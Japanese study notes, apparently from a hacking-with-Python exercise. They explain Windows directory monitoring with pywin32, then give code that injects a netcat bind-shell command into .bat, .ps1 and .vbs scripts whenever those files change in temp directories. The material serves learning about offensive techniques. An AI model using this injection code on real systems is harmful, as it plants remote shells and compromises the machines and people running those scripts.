# monitor関数

いつそのディレクトリでそのファイルが加えられたか、削除されたか、変更されたかを監視する

```python
FILE_LIST_DIRECTORY = 0x001
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]
```

`PATHS`が監視するディレクトリのリスト。

`tempfile.gettempdir()`は、一時ファイルを格納するディレクトリ。
（ターミナルでpython起動して確認できる。）

## win32file.CreateFile

```python
h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,       
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )
```

まずはこれで監視するディレクトリのハンドル取得する。

`CreateFile`の第一引数はファイル名だけど、ここでは監視対象のディレクトリのパス。

第二引数は、読み取り・書き込み等のアクセスタイプ（int）。

第三引数でファイルの共有方法を指定する：

- `FILE_SHARE_READ`：後続のオープン操作で読み取りアクセスが要求された場合にそのオープンを許可する
- `FILE_SHARE_WRITE`：後続のオープン操作で書き込みアクセスが要求された場合にそのオープンを許可する
- `FILE_SHARE_DELETE`：後続のオープン操作で削除アクセスが要求された場合にそのオープンを許可する

`OPEN_EXISTING`で、ファイルがあればオープンするという意味。

その次の引数はファイルの属性やフラグを指定。

`FILE_FLAG_BACKUP_SEMANTICS`バックアップまたは復元操作のためにファイルをオープンまたは作成する。

参考：

 - [ファイル操作](http://wisdom.sakura.ne.jp/system/winapi/win32/win111.html)
 - [win32file.CreateFileについて](http://timgolden.me.uk/pywin32-docs/win32file__CreateFile_meth.html)

## win32file.ReadDirectoryChangesW


ファイル操作があったことを知らせてくれる。

返り値は(action, filename)のようなリスト=（発生したイベントのタイプ,変更が加えられたファイル名）

```python
results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
``` 

第一引数に（上で作った）ディレクトリへのハンドル。

`1024`は、得た結果を割り当てるバッファのサイズ。

第三引数では`ReadDirectoryChangesW`関数がディレクトリまたはディレクトリツリーを監視するか否かを指定する。

Trueなら指定されたディレクトリをルートとするディレクトリツリーを監視する。

その後の長いやつは”監視に使うフィルタ条件”つまり「指定したものについては監視します！」ということ。
意味は以下の通り：

- `FILE_NOTIFY_CHANGE_ATTRIBUTES`：ファイル属性の変更
- `FILE_NOTIFY_CHANGE_DIR_NAME`：ディレクトリ名の変更
- `FILE_NOTIFY_CHANGE_FILE_NAME`：ファイル名の変更
- `FILE_NOTIFY_CHANGE_LAST_WRITE`：ファイルの前回書き込み日時
- `FILE_NOTIFY_CHANGE_SECURITY`：セキュリティ記述子
- `FILE_NOTIFY_CHANGE_SIZE`：ファイルサイズの変更

参考：

- [Win32API ディレクトリの変更を監視する](https://s-kita.hatenablog.com/entry/20100707/1278512099)
- [win32file.ReadDirectoryChangesWについて](http://timgolden.me.uk/pywin32-docs/win32file__ReadDirectoryChangesW_meth.html)

# コードインジェクション

定数の部分は自分の環境にあわせて。

```python
NETCAT = 'c:\\users\\tim\\work\\netcat.exe'
TGT_IP = '192.168.1.208'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'

FILE_TYPES = {
    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
}
```
これヤベー。
すげー

ファイル変更があったら、（ファイルの拡張子に応じて）そのファイルの中にこちら側の悪意あるコードを書き入れる（コードインジェクション）。

そのコードがnetcat。ターゲットにポート9999番でリッスンさせるもの。

```python
def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')
```

上記の順番で繋げたものをファイルに書き入れる。

`os.path.splitext`はこんな動作する👇

```
>>> os.path.splitext('exploit.py')
('exploit', '.py')
```

